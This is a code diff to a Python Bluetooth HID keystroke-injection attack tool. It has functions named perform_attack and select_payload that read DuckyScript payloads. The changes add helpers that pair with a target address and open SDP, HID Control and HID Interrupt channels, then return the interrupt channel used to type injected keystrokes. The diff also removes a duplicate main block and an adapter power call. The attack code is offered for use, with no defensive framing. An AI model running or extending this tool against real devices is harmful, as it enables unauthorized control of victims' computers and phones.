@@ -612,8 +612,27 @@ def setup_bluetooth(target_address, adapter_id):
     adapter = Adapter(adapter_id)
     # Removing fatal set_property calls as they fail on some CSR dongles in VMs
     log.info("Skipping hardware renaming to ensure compatibility...")
-    adapter.power(True)
     return adapter
+
+def initialize_pairing(agent_iface, target_address):
+    try:
+        with PairingAgent(agent_iface, target_address) as agent:
+            log.debug("Pairing agent initialized")
+    except Exception as e:
+        log.error(f"Failed to initialize pairing agent: {e}")
+        raise ConnectionFailureException("Pairing agent initialization failed")
+
+def establish_connections(connection_manager):
+    if not connection_manager.connect_all():
+        raise ConnectionFailureException("Failed to connect to all required ports")
+
+def setup_and_connect(connection_manager, target_address, adapter_id):
+    connection_manager.create_connection(1)   # SDP
+    connection_manager.create_connection(17)  # HID Control
+    connection_manager.create_connection(19)  # HID Interrupt
+    initialize_pairing(adapter_id, target_address)
+    establish_connections(connection_manager)
+    return connection_manager.clients[19]
 
 def perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode, recon_only=False):
     """Encapsulates the attack logic for a single target."""
@@ -792,14 +811,6 @@ def select_payload():
         print(f"Selected payload: {selected_payload}")
         return read_duckyscript(selected_payload)
     return None
-
-if __name__ == "__main__":
-    setup_logging()
-    log = logging.getLogger(__name__)
-    try:
-        main()
-    finally:
-        terminate_child_processes()
 
 if __name__ == "__main__":
     setup_logging()
